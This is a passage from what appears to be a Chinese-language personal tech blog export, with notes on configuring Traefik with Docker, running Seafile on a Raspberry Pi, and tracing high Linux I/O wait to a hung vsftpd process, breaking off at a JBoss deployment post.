time=\"2020-10-18T12:15:24Z\" level=error msg=\"service \\\"seafile\\\" error: port is missing\" providerName=docker container=seafile-7d40e43962df0ec1ca3af66d553c7ae5b81364497bb5f4f2c77597c95d210370\n\n~~要開隨一 port? 就能解決~~\n\n原本是用 traefik.http.services.seafile.loadbalancer.server.port=80\n~~**但可能也不是應該用這種方式** 有更好方式再補充~~\n去控制 port 不是用 traefik.port\n\n\n查看官方文件[Docker - Traefik](https://doc.traefik.io/traefik/providers/docker/)\n\n> Ports detection works as follows:\n>\n>    If a container exposes only one port, then Traefik uses this port for private communication.\n>    If a container exposes multiple ports, or does not expose any port, then you must manually specify which port Traefik should use for communication by using the label traefik.http.services._service_name_.loadbalancer.server.port (Read more on this label in the dedicated section in routing).\n\nexposes 就是 docker 對外設定的 port\n\n```dockerfile\nEXPOSE <port> [<port>/<protocol>...]\n```\n\n難怪...，nextcloud seafile 都需要設定 traefik.http.services.seafile.loadbalancer.server.port=80\n\n\n\n#### https 導向問題\n\n進去 nextcloud https 網站時候\n會發現進不去\n\n內層服務強制 https 取消\n\n#### Container 取消關聯 \n\n[Backend: Docker - Træfik](https://doc.traefik.io/traefik/v1.4/configuration/backends/docker/)\n\ndocker run -d -p 8000:8000 -p 9000:9000 -l \"traefik.enable=false\" --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:alpine@sha256:f13f14be723c848e119fa8d85c932dbcc0cbe3cfe09e784ceb09adefa248ccd1\n\n#### HTTPS redirection (80 to 443)\n\n待確認\n\n--entrypoints.web.address=:80\n--entrypoints.web.http.redirections.entryPoint.to=web-secure\n--entrypoints.web.http.redirections.entryPoint.scheme=https\n--entrypoints.web-secure.address=:443\n\n\n這邊要注意 entrypoints.`web-secure`.address 裡面的命名\n\n#### 同時使用 http 和 https 反向代理\n\n用 nginx , apache 相關反向代理\n相信不用處理是否要 http , https \n預設就可以了\n\n但我發現這邊不行\n後來看了官網文件[Routers - Traefik](https://doc.traefik.io/traefik/routing/routers/#general)\n\n> Routers for HTTP & HTTPS\n> \n> If you need to define the same route for both HTTP and HTTPS requests, you will need to define two different routers: one with the tls section, one without.\n\n```toml\n## Dynamic configuration\n[http.routers]\n  [http.routers.my-https-router]\n    rule = \"Host(`foo-domain`) && Path(`/foo-path/`)\"\n    service = \"service-id\"\n    # will terminate the TLS request\n    [http.routers.my-https-router.tls]\n\n  [http.routers.my-http-router]\n    rule = \"Host(`foo-domain`) && Path(`/foo-path/`)\"\n    service = \"service-id\"\n```\n\n簡單說就是要寫兩個 router \n\nDocker Label 設定方法\n\n```yml\n    labels:\n      - \"traefik.backend=whoami\"\n      - \"traefik.http.routers.whoami.rule=Host(`whoami.ooo.duckdns.org`) || PathPrefix(`/whoami`)\"\n      - \"traefik.port=8000\"\n      #- \"traefik.protocol=http\" default http\n      - \"traefik.http.routers.whoami-https.rule=Host(`whoami.ooo.duckdns.org`)\"\n      - \"traefik.http.routers.whoami-https.tls=true\"\n\n```\n\n\n#### traefik docker 設定小記\n\n這邊主要是 traefik 的 docker 設定\n\n提幾個我覺得~~驚奇~~重要\n\n1. endpoint 指定 docker socket file 路徑[Docker - Traefik](https://doc.traefik.io/traefik/providers/docker/#endpoint)\n\n2. exposedByDefault\n\n單一 port 可以不用設定連到是因為這個關係\n預設true\n\n3. defaultRule [Docker - Traefik](https://doc.traefik.io/traefik/providers/docker/#defaultrule)\n\nDefault=Host(`{{ normalize .Name }}`) \n\n建立 docker 最自動產生 docker router 名稱原來是這邊來的\n\n\n#### 設定 BaseAuth\n\n##### 產生 帳號/密碼\n\n# Note: when used in docker-compose.yml all dollar signs in the hash need to be doubled for escaping.\n# To create user:password pair, it's possible to use this command:\n# echo $(htpasswd -nb user password) | sed -e s/\\\\$/\\\\$\\\\$/g\n\n- [BasicAuth - Traefik](https://doc.traefik.io/traefik/middlewares/basicauth/)\n- [在线 htpasswd 生成器](https://tool.oschina.net/htpasswd)\n\n```\n  - \"traefik.http.routers.router1.middlewares=test-auth@docker\"\n  - \"traefik.http.middlewares.test-auth.basicauth.users=test:$$apr1$$wB4YY5ua$$EocdCl08mI3Pk.6nItqZC/,test2:$$apr1$$2n2YpbTP$$c.FBjTJcfU0FkFZ4u912G/\"\n```\n\n##### 從檔案讀取帳號密碼\n\n```yml\nlabels:\n  - \"traefik.http.middlewares.test-auth.basicauth.usersfile=/path/to/my/usersfile\"\n```\n\n```\ntest:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/\ntest2:$apr1$d9hr9HBB$4HxwgUir3HP4EsggP/QNo0\n```\n\n\n\n\n#### openvpn 憑證\n\nPiVPN \n\n[OpenVPN Access Server & Let’s Encrypt | Medium](https://medium.com/@ncsayeed/guide-openvpn-access-server-lets-encrypt-certbot-d8b65e8fdef)\n[SnowMB/traefik-certificate-extractor: Tool to extract Let's Encrypt certificates from Traefik's ACME storage file.](https://github.com/SnowMB/traefik-certificate-extractor)\n[Store traefik let's encrypt certificates not as json - Stack Overflow](https://stackoverflow.com/questions/47218529/store-traefik-lets-encrypt-certificates-not-as-json)\n[OpenVPN Access Server Letsencrypt](https://gist.github.com/HighMacGuy/3cf42ce21d3bd923f2440f9938e2f664)\n[ldez/traefik-certs-dumper: Dump ACME data from Traefik to certificates](https://github.com/ldez/traefik-certs-dumper)\n[OpenVPN with Traefik 2.2 using UDP · Jurian Sluiman](https://juriansluiman.nl/posts/openvpn-with-traefik-2.2/)\n\n\n* [Traefik, OpenVPN and Direct Container Connections on Docker Swarm](https://alex.thom.ae/2020/09/19/traefik-openvpn-docker-swarm/)\n* [authelia/authelia: The Single Sign-On Multi-Factor portal for web apps](https://github.com/authelia/authelia)\n* [Traefik v2.0 with Cloudflare Wildcard and OpenVPN](https://gist.github.com/darth-veitcher/93acda9617bab3e1de0264cebf4637fc)\n* [当我有一台服务器时我做了什么 - 山月行的个人空间 - OSCHINA - 中文开源技术交流社区](https://my.oschina.net/u/4592353/blog/4434556)\n* [Linux SSH 加上 Google 兩階段認證服務檢核 | Tsung's Blog](https://blog.longwin.com.tw/2014/10/ssh-google-2-factor-authentication-2014/)\n* [Ubuntu 16.04 安裝 OpenVPN 加上 MFA 驗證 – Mr. 沙先生](https://shazi.info/ubuntu-16-04-%E5%AE%89%E8%A3%9D-openvpn-%E5%8A%A0%E4%B8%8A-mfa-%E9%A9%97%E8%AD%89/)\n* [終於解決 Linux 上 VPN 連線 SSL 連線錯誤的問題 | Tsai I-ta's Blog](https://tsai.it/archives/2018/08/%E7%B5%82%E6%96%BC%E8%A7%A3%E6%B1%BA-linux-%E4%B8%8A-vpn-%E9%80%A3%E7%B7%9A-ssl-%E9%80%A3%E7%B7%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%95%8F%E9%A1%8C/)\n\n#### access log\n\ncli\n\n--accesslog=true\n\n[Access Logs - Traefik](https://doc.traefik.io/traefik/observability/access-logs/)\n\n#### log\n\n[一文搞懂Traefik的可观测性](https://juejin.im/post/6844904117429600270)\n","tags":["traefik"],"categories":["Linux"]},{"title":"Raspberry Pi 使用 Seafile 初體驗","url":"%2Fblog%2F2020%2F10%2F12%2FRaspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97%2F","content":"\n之前使用[NextCloud 使用docker簡易安裝筆記 | 程式狂想筆記](https://malagege.github.io/blog/2018/09/16/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/#more)\n登入頁面就要等了老半天\n進去聽歌點一首歌也要等一下\n原本以為他上傳檔案有做加解密\n但我後來發現 NextCloud PI 預設沒打開\n把幾個套件拿掉也一樣慢\n\n不過也又 NextCloud 一陣子\n因為他竟然有支援 Chrome Media Hub \n可進行上一首、下一首\n![](https://storage.googleapis.com/gweb-uniblog-publish-prod/original_images/Chrome_Media_Control.gif)\n[Manage audio and video in Chrome with one click](https://blog.google/products/chrome/manage-audio-and-video-in-chrome/)\n可算非常方便\n\n但最近我覺得太慢了\n原本以為是 CPU 的問題\n後來看到官網說是 IO 速度太慢\n所以我最近在找找有沒有替代方案\n\n<!--more-->\n\n## 相關其他搜尋\n\n\n\n以下幾乎是資料夾內容同步，目前沒使用就先不研究\n\n- [Sharry：一个非常好用的文件分享程序-荒岛](https://lala.im/7154.html)\n- [ResilioSync：公私兼备的同步盘-荒岛](https://lala.im/4737.html)\n- [使用Syncthing自建私有同步盘-荒岛](https://lala.im/4731.html)\n- [Dropit：一个简洁的文件上传工具-荒岛](https://lala.im/6617.html)\n- [CozyCloud：基于GO语言开发的网盘/同步盘-荒岛](https://lala.im/4698.html)\nCozyCloud 是 Golang 寫的，沒有音樂播放功能，感覺跟 seafile 差不多\n之後會再嘗試看看，主要看有沒有不加密檔案功能\n\n## Seafile\n\n### 優點、缺點\n\n#### 優點\n\n1. 速度比 NextCloud 快\n2. 基本檔案上傳管理功能都有\n3. 可以編輯 Markdown 檔案\n\n我目前只想到這樣 = =a\n但這個就夠讓人跳了\n\n#### 缺點\n\n1. NextCloud 很多功能都沒有 (DLNA,Media Hub)\n2. 檔案上傳一定會做加密，不能手動關掉(聽說是為了做歷程關係)\n3. 上傳大檔案可能 PI 會等很久(可能再加密部分) 我有測試 1GB 大概也要卡很久\n\n### 音樂解決方案\n\n[Clementine 音樂播放器](https://www.clementine-player.org/zh_TW/)\n\n裝這個撥放器可以跟 Seafile 串接\n目前介面還算能接受\n音樂不會全部抓到硬碟\n這個可能我還滿需要這樣的\n\n我有看到他有支援 Subsonic\n但是我使用覺得介面不是很好用用\n\n大缺點就是需要安裝撥放器\n\n\n## 輕鬆使用 docker 體驗 Seafile\n\n### build images\n\n```bash\n# 請使用 Root 權限，官網是這樣說的。但我看裡面語法沒什麼問題\n# 感覺怕權限失敗\ngit clone https://github.com/domenukk/seafile-docker-pi.git\ncd ./seafile-docker-pi/image\nmake base && make server \n```\n\n### run \n\n```bash\ndocker run -d --name seafile   \\\n-e SEAFILE_SERVER_HOSTNAME=192.168.1.202:8888  \\\n-p 8888:80 \\\nseafileltd/seafile:pi\n```\n因為我 80 已經有用 NextCloud \n執行會有點久，你看他的 log 看起來完成\n其實還沒有跑完，等一回就好了\n\nhttps 下次應該會考慮就 Caddy 去做反向代理\n[Traefik 搭配 Docker 自動更新 Let’s Encrypt 憑證 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY](https://blog.wu-boy.com/2019/01/traefik-docker-and-lets-encrypt/)\n不過也有考慮使用 Traefik\n\n預設帳號密碼是 `me@example.com` / `asecret`\n\n相關教學[用Docker部署 Seafile 服务 - Seafile服务器手册中文版](https://manual-cn-origin.seafile.com/deploy/deploy_with_docker)\n\n\n#### 自訂密碼\n\n```\ndocker run -d --name seafile \\\n  -e SEAFILE_SERVER_HOSTNAME=seafile.example.com \\\n  -e SEAFILE_ADMIN_EMAIL=me@example.com \\\n  -e SEAFILE_ADMIN_PASSWORD=a_very_secret_password \\\n  -v /opt/seafile-data:/shared \\\n  -p 80:80 \\\n  seafileltd/seafile:pi\n```\n\n#### Let's encrypt SSL certificate\n\n```bash\ndocker run -d --name seafile \\\n  -e SEAFILE_SERVER_LETSENCRYPT=true \\\n  -e SEAFILE_SERVER_HOSTNAME=seafile.example.com \\\n  -e SEAFILE_ADMIN_EMAIL=me@example.com \\\n  -e SEAFILE_ADMIN_PASSWORD=a_very_secret_password \\\n  -v /opt/seafile-data:/shared \\\n  -p 80:80 \\\n  -p 443:443 \\\n  seafileltd/seafile:pi\n```\n\n#### 修改設定重啟 Seafile\n\n設定檔路徑 `shared/seafile/conf`\n\ndocker restart seafile\n\n#### 加一個管理者\n\n```\ndocker exec -it seafile /opt/seafile/seafile-server-latest/reset-admin.sh\n```\n\n\n#### 檔案路徑\n\n/shared 為根路徑\n\n-v /opt/seafile-data:/shared \n\n```bash\ndocker run -d --name seafile   \\\n-e SEAFILE_SERVER_HOSTNAME=192.168.1.202:8888  \\\n-p 8888:80 \\\n-v /media/USBdrive/seafile-data:/shared \\\nseafileltd/seafile:pi\n```\n\n#### 垃圾回收\n\ndocker exec seafile /scripts/gc.sh.\n\n\n### 其他相關文章\n\n- [树莓派部署 seafile 和 nextcloud 比较 - 知乎](https://zhuanlan.zhihu.com/p/140289336)\n- [domenukk/seafile-docker-pi: A Docker image for Seafile server - Raspberry Pi Edition](https://github.com/domenukk/seafile-docker-pi)\n- [开源的私有云网盘程序Seafile安装教程-荒岛](https://lala.im/671.html)","tags":["seafile"],"categories":["Linux"]},{"title":"Linux IO 效能研究怎麼看","url":"%2Fblog%2F2020%2F10%2F03%2FLinux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B%2F","content":"\n最近除了看 CPU 使用率過高\n之前 Raspberry Pi 使用 NextCloud 的時候速度非常慢\n一直以為是 CPU 關係，但後來發現不是\n官網友提到是 IO 效能關係\n\n<!--more-->\n\n一直以為 IO 效能跟硬碟有關係\n但後來研究一翻，參考網路上一些文章\n後來 CPU, RAM, Network ... 等等都有關係\n\n## IO 效能怎麼看?\n\n[Linux 性能监控 —— 磁盘 I/O_wenniuwuren-CSDN博客](https://blog.csdn.net/wenniuwuren/article/details/50558183)\n\n{% asset_img 1.png top %}\n\n> 二. 如何衡量磁盤 I/O 存在瓶頸\n> 磁盤 I/O 是否存在瓶頸取決於當前機器 CPU 的總核數（總核數計算移步我的另一篇博文: Linux 性能監控 ---- Load Average）。 公式： X(IO) = 1/（cpu 總核數） 用來衡量磁盤 I/O 情況， 以上圖的機器為例子， 這台機器 2 CPU 12 核 也就是總核心數為 2*12 = 24， X(IO) = 0.04166666 = 4.17%。 \n如果上圖指標長時間大於 4.17%， 那麼我們的網站響應可能就會變慢了。  \n\n簡單來說就是 top\nCPU 那一行 13 wa 那一行\n X(IO) = 1/（cpu 總核數）\n我樹梅派沒有使用百分比，不過他這邊應該沒放\n\n\n## IO 測試方法\n\n[blog.toright.com/posts/5051/linux-disk-io-效能測試.html/amp](https://blog.toright.com/posts/5051/linux-disk-io-%E6%95%88%E8%83%BD%E6%B8%AC%E8%A9%A6.html/amp)\n\n使用最簡單方法\n\n```bash\ndd if=/dev/zero of=/tmp/bench bs=1M count=1024 && rm /tmp/bench\n```\n\n在樹梅派使用 SD 做 wa有到 0.25 左右，不過改在 USB 上面\nwa到 0.5 上下，CPU 雖然沒有吃很高\n但是這時候很明顯感覺 pietty 操作跟重新開市窗操作連線會變慢\n看來程式處理速度跟這個數字也有關\n\n\n## 安裝 iostat\n\n```bash\nsudo apt install sysstat \n```\n- [解決 iostat command not found](https://www.opencli.com/linux/fix-iostat-command-not-found)\n\n- [linux wa%過高，iostat查看io狀況 - 測試天堂 - 51Testing軟件測試網 51Testing軟件測試網-軟件測試人的精神家園](http://www.51testing.com/html/48/202848-242043.html)\n\n## wa 高不一定是出在硬碟 io\n\n\n* [傲笑紅塵路: 監控Linux 系統效能狀況](https://www.lijyyh.com/2012/01/linux.html) {% asset_link web1.png 備份圖 %}\n\n可能是網路等等其他\n這邊有查到 sar 可以查詢 CPU, RAM, Disk I/O, Network \n\n\n網路查詢方法\n[使用sar工具进行cpu/mem/io/network等性能分析_@_囚徒-2018_的家园-CSDN博客](https://blog.csdn.net/wangjianno2/article/details/39256163)\n[12. sar 找出系统瓶颈的利器 — Linux Tools Quick Tutorial](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/sar.html)\n[记一次服务端 IO 瓶颈问题定位 · TesterHome](https://testerhome.com/topics/20606)\n\n\n[使用 sar 記錄系統資源使用狀態 | TechNote](http://technote.aven-network.com/826/using-sar-log-system-resource-status)\n\n[菜鳥工程師 肉豬: Linux htop 系統程序監控工具簡介](https://matthung0807.blogspot.com/2019/06/linux-htop.html?m=0)\n\n[7 個實例教你使用 sar 命令生成CPU、內存和輸入輸出埠的報告 | Linux Story](https://linuxstory.org/generate-cpu-memory-io-report-sar-command/zh-tw/)\n[如何在Raspberry Pi 用USB碟開機 – Wayne's Garden](https://wayne65.ap.ngrok.io/wp/%E5%A6%82%E4%BD%95%E5%9C%A8raspberry-pi-%E7%94%A8usb%E7%A2%9F%E9%96%8B%E6%A9%9F/)\n[案例：系统的 CPU 使用率很高，但为啥却找不到高 CPU 的应用？ | Laravel China 社区](https://learnku.com/articles/39516)\n\n## 20201004 查 Raspberry pi 的 top CPU 異常飆高\n\n### PI 環境簡單介紹\n\n之前有使用 rclone 掛載 Google 雲端硬碟\n但是最近使用 ftp(vsftpd)下載完檔案 發現 wa CPU 標高\n(中途有遇到我的D朝下載超過容量關係，其他下載失敗)\nswap 也吃了 80MB(總共 100 MB)\nswap 應該可能是因為我 rclone 掛載模式關係\nwa 沒有降下來原因我覺得要找一下\n\n## 用上面指令查詢經過(可跳過這篇)\n\n這邊有使用 SAR 查看\n```\npi@PI203:~ $ sar -r 2 5\nLinux 4.19.118-v7+ (PI203)      2020年10月03日  _armv7l_        (4 CPU)\n\n03時32分26秒 kbmemfree   kbavail kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty\n03時32分28秒     89612    642628    238560     25.16     14860    522124    777284     73.98    185960    542316         0\n03時32分30秒     89612    642628    238560     25.16     14860    522124    777284     73.98    186020    542316         0\n03時32分32秒     89604    642620    238568     25.16     14860    522124    777284     73.98    186020    542316         0\n03時32分34秒     89620    642636    238544     25.16     14860    522128    779252     74.17    186252    542320         0\n03時32分36秒     89604    642620    238564     25.16     14860    522124    779252     74.17    186108    542316         0\n平均時間：     89610    642626    238559     25.16     14860    522125    778071     74.05    186072    542317         0\npi@PI203:~ $ sar -r 2 5\nLinux 4.19.118-v7+ (PI203)      2020年10月03日  _armv7l_        (4 CPU)\n\n03時32分41秒 kbmemfree   kbavail kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty\n03時32分43秒     89856    642872    238312     25.13     14860    522124    777832     74.03    185968    542316         0\n03時32分45秒     89856    642872    238312     25.13     14860    522124    777832     74.03    185968    542316         0\n03時32分47秒     89864    642880    238304     25.13     14860    522124    777832     74.03    185968    542316         0\n03時32分49秒     89864    642880    238304     25.13     14860    522124    777832     74.03    185968    542316         0\n03時32分51秒     89864    642880    238304     25.13     14860    522124    777832     74.03    185968    542316         0\n平均時間：     89861    642877    238307     25.13     14860    522124    777832     74.03    185968    542316         0\n```\n\n這邊 commit 怪怪的，網路查好像 commit 需要大於 100%\n\n> %commit\n> 當前需要的內存/RAM+swap，要保證大於100%，因為內核通常都overcommit內存。\n\n- [从vmstat命令里看服务器瓶颈 | Chris Chan's BLOG](https://rorschachchan.github.io/2018/01/03/%E4%BB%8Evmstat%E5%91%BD%E4%BB%A4%E9%87%8C%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%93%B6%E9%A2%88/)\n- [vmstat 的用法和判别系统瓶颈_RisenWang 的博客-CSDN博客](https://blog.csdn.net/risen16/article/details/53355417)\n\n```\npi@PI203:~ $ vmstat 1 20\nprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n 1  1  85568  89920  14888 559472    0    0     2     1    3    2  1  1 98  1  0\n 0  1  85568  89896  14888 559472    0    0     0     0  178  266  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  175  272  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  164  250  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  202  304  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  183  283  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  180  267  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  161  244  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  166  253  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  177  275  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  190  295  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  188  289  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  179  270  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  177  275  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  175  266  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  164  254  0  0 75 25  0\n 1  1  85568  89896  14888 559472    0    0     0     0  187  289  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  169  255  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  181  283  0  0 75 25  0\n 0  1  85568  89896  14888 559472    0    0     0     0  171  248  0  0 75 25  0\n```\n\n這邊wa 這麼高，沒有降下來...這邊 top 應該跟 wa 是一樣的東西\n\n## vsftp 程式 uninterruptible sleep 狀態\n\n\n參照這個shell 找到 vsftp 有問題[iowait 过高问题的查找及解决linux | 张志明的个人博客](https://www.503error.com/2016/iowait-%E8%BF%87%E9%AB%98%E9%97%AE%E9%A2%98%E7%9A%84%E6%9F%A5%E6%89%BE%E5%8F%8A%E8%A7%A3%E5%86%B3linux/1035.html)\n裡面有提到用 iotop 但我看數字都正常\n\n### 查看 uninterruptible sleep 程式\n\n```\n # for x in `seq 1 1 10`; do ps -eo state,pid,cmd | grep \"^D\"; echo \"----\"; sleep 5; done\nD 18634 /usr/sbin/vsftpd /etc/vsftpd.conf\n----\nD 18634 /usr/sbin/vsftpd /etc/vsftpd.conf\n----\n```\n\n這邊除了這個方法\n```\nwatch -n 1 \"(ps aux | awk '\\$8 ~ /D/  { print \\$0 }')\"\n```\n[Linux - How can I see what's waiting for disk IO - Server Fault](https://serverfault.com/questions/61510/linux-how-can-i-see-whats-waiting-for-disk-io)\n\n[linux - Find process causing IO wait time - Server Fault](https://serverfault.com/questions/616570/find-process-causing-io-wait-time)\niotop 不知道能不能看到\n\n\n\n### lsof -p 18634\n\n```\nCOMMAND   PID USER   FD      TYPE     DEVICE SIZE/OFF    NODE NAME\nvsftpd  18634   pi  cwd   unknown                             /mnt/gdrive/ACG/TV/202007/沒落要塞 DECA-DENCE (stat: Permission denied)\nvsftpd  18634   pi  rtd       DIR      179,2     4096       2 /\nvsftpd  18634   pi  txt       REG      179,2   113240   24973 /usr/sbin/vsftpd\nvsftpd  18634   pi  mem       REG      179,2    42632    1674 /lib/arm-linux-gnueabihf/libnss_files-2.28.so\nvsftpd  18634   pi  mem       REG      179,2    26600    1697 /lib/arm-linux-gnueabihf/librt-2.28.so\nvsftpd  18634   pi  mem       REG      179,2    17956    1637 /lib/arm-linux-gnueabihf/libcap-ng.so.0.0.0\nvsftpd  18634   pi  mem       REG      179,2   130416    1693 /lib/arm-linux-gnueabihf/libpthread-2.28.so\nvsftpd  18634   pi  mem       REG      179,2     9768    1644 /lib/arm-linux-gnueabihf/libdl-2.28.so\nvsftpd  18634   pi  mem       REG      179,2   116032    1580 /lib/arm-linux-gnueabihf/libaudit.so.1.0.0\nvsftpd  18634   pi  mem       REG      179,2    71576    1671 /lib/arm-linux-gnueabihf/libnsl-2.28.so\nvsftpd  18634   pi  mem       REG      179,2  1296004    1636 /lib/arm-linux-gnueabihf/libc-2.28.so\nvsftpd  18634   pi  mem       REG      179,2    17872    1638 /lib/arm-linux-gnueabihf/libcap.so.2.25\nvsftpd  18634   pi  mem       REG      179,2  2118048   15238 /usr/lib/arm-linux-gnueabihf/libcrypto.so.1.1\nvsftpd  18634   pi  mem       REG      179,2   454924   15239 /usr/lib/arm-linux-gnueabihf/libssl.so.1.1\nvsftpd  18634   pi  mem       REG      179,2    50896    2417 /lib/arm-linux-gnueabihf/libpam.so.0.84.2\nvsftpd  18634   pi  mem       REG      179,2    30508    1715 /lib/arm-linux-gnueabihf/libwrap.so.0.7.6\nvsftpd  18634   pi  mem       REG      179,2    17708   14650 /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so\nvsftpd  18634   pi  mem       REG      179,2   138604    1559 /lib/arm-linux-gnueabihf/ld-2.28.so\nvsftpd  18634   pi    0u     sock        0,8      0t0 2903508 protocol: TCPv6\nvsftpd  18634   pi    1u     sock        0,8      0t0 2903508 protocol: TCPv6\nvsftpd  18634   pi    2u     sock        0,8      0t0 2903508 protocol: TCPv6\nvsftpd  18634   pi    3w      REG      179,2    37351    1427 /var/log/vsftpd.log.1\nvsftpd  18634   pi    4r  unknown                             /mnt/gdrive/ACG/TV/202007/沒落要塞 DECA-DENCE/[Airota][Deca-Dence][05][1080p AVC AAC][CHT].mp4 (stat: Permission denied)\nvsftpd  18634   pi    5u     unix 0x97115dd6      0t0 2898890 type=STREAM\nvsftpd  18634   pi    6u     sock        0,8      0t0 2907724 protocol: TCPv6\n```\n\n這邊查了一下\n\n> 產生D狀態的原因出現uninterruptible sleep狀態的進程一般是因為在等待IO，例如磁盤IO、網絡IO等。在發出的IO請求得不到相應之後，進程一般就會轉入uninterruptible sleep狀態，例如若NFS服務端關閉時，如果沒有事先amount相關目錄。在客戶端執行df的話就會掛住整個會話，再用ps axf查看的話會發現df進程狀態位已經變成D。\n\n[Linux 進程的 Uninterruptible sleep(D) 狀態 - Still water run deep - 開發者的網上家園](https://www.cnblogs.com/xiaotengyi/p/7644336.html)\n\nvmstat 可以看到 第二個 b 確實我顯示有 1(可參照上面)\n\n> 由於只有運行狀態的進程才可以接受信號，所以處於uninterruptible sleep的進程，是無法用kill命令殺掉的，即使是加9或15的信號。\n\n但要該怎麼處理呢?\n\n\n> 正是因為得不到IO的響應，進程才進入了uninterruptible sleep狀態，所以要想使進程從uninterruptible sleep狀態恢復，就得使進程等待的IO恢復，比如如果是因為從遠程掛載的NFS卷不可訪問導致進程進入uninterruptible sleep狀態的，那麼可以通過恢復該NFS卷的連接來使進程的IO請求得到滿足，除此之外，要想幹掉處在D狀態進程就只能重啟整個Linux系統（D進程並不能通過kill 和kill -9 殺掉） 。\n> 作者：不穿格子衫的程序猿\n> 链接：https://www.jianshu.com/p/8f29d6d70fd6\n> 来源：简书\n> 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n[進程查看命令 - 簡書](https://www.jianshu.com/p/8f29d6d70fd6)\n\n### 亂打亂撞解決\n\n網路上說無法kill強制刪掉\n這邊我決定 kill 掉看看\n一般 kill 無法\n但 kill -9 就刪掉了...\n這邊就不繼續探討了\n\ntop wa 就正常了...\n\n簡單回顧重點\n\nvmstat 第二個 b 可以先確認 uninterruptible sleep程式\n再尋找 uninterruptible sleep 程式做處理\n\n\n\n## wa 和 id\n\n> 當前的CPU運行情況：\n> \n> us：非nice用戶進程佔用CPU的比率\n> sy：內核、內核進程佔用CPU的比率；\n> ni：如果一些用戶進程修改過優先級，這裡顯示這些進程佔用CPU時間的比率；\n> id：CPU空閒比率，如果系統緩慢而這個值很高，說明系統慢的原因不是CPU負載高；\n> wa：CPU等待執行I/O操作的時間比率，該指標可以用來排查磁盤I/O的問題，通常結合wa和id判斷\n> hi：CPU處理硬件終端所佔時間的比率；\n> si：CPU處理軟件終端所佔時間的比率；\n> st：流逝的時間，虛擬機中的其他任務所佔CPU時間的比率；\n> \n> 用戶進程佔比高，wa低，說明系統緩慢的原因在於進程佔用大量CPU，通常還會伴有教低的id，說明CPU空轉時間很少；\n> wa低，id高，可以排除CPU資源瓶頸的可能。\n> wa高，說明I/O佔用了大量的CPU時間，需要檢查交換空間的使用，交換空間位於磁盤上，性能遠低於內存，當內存耗盡開始使用交換空間時，將會給性能帶來嚴重影響，所以對於性能要求較高的服務器，一般建議關閉交換空間。另一方面，如果內存充足，但wa很高，說明需要檢查哪個進程佔用了大量的I/O資源。\n\n- [Linux系统排查2——CPU负载篇 - 王智愚 - 开发者的网上家园](https://www.cnblogs.com/security-darren/p/4700384.html)\n- [Linux下性能分析工具 | zhqqqy](https://zhqqqy.github.io/2018/08/23/Linux%E4%B8%8B%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/)\n\n\nCPU使用率低但負載高\n![](https://upload-images.jianshu.io/upload_images/16898515-1f65ff3be1502b87.png?imageMogr2/auto-orient/strip|imageView2/2/w/585)\n\nload average 是對 CPU 負載的評估，其值越高，說明其任務隊列越長，處於等待執行的任務越多。但CPU卻在摸魚（idls高），這就說明有可能有很多假死進程，可能寫的程序有等待（I/O）或者睡眠。\n\n作者：Carson_dotnet\n链接：https://www.jianshu.com/p/27d8c33e03cf\n来源：简书\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n[Linux CPU過載判斷以及分析 - 簡書](https://www.jianshu.com/p/27d8c33e03cf)","tags":["io"],"categories":["Linux"]},{"title":"JBoss 佈署程式和 cli 操作小記","url":"%2Fblog%2F2020%2F09%2F29%2FJBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98%2F","content":"\n最近公司佈署 war 檔程式\n總是常常遇到 OOM(Out of Memory) 狀況\n這時候有幾個佈署必須要想辦法排除\n這邊只記錄我排除經驗與猜測\n\n<!--more-->\n\n首先，我先講我認知的佈署 war 兩個方法\n在 `$JBOSS_HOME/standalone/deployment` 裡面放置 war 檔案就可以佈署\n另一個方法是用 SE 會用一個方法佈署到 JBoss 裡面\n但是 `$JBOSS_HOME/standalone/deployment` 不會看到 war 檔\n\n## 手動重新佈署\n\n假如上的 war 沒有動作\n\ntouch jboss-helloworld.war.dodeploy\n\n可以這樣做\n\n## 異常事件重新佈署上到舊程式\n\n首先，我專案用的佈署 war 是 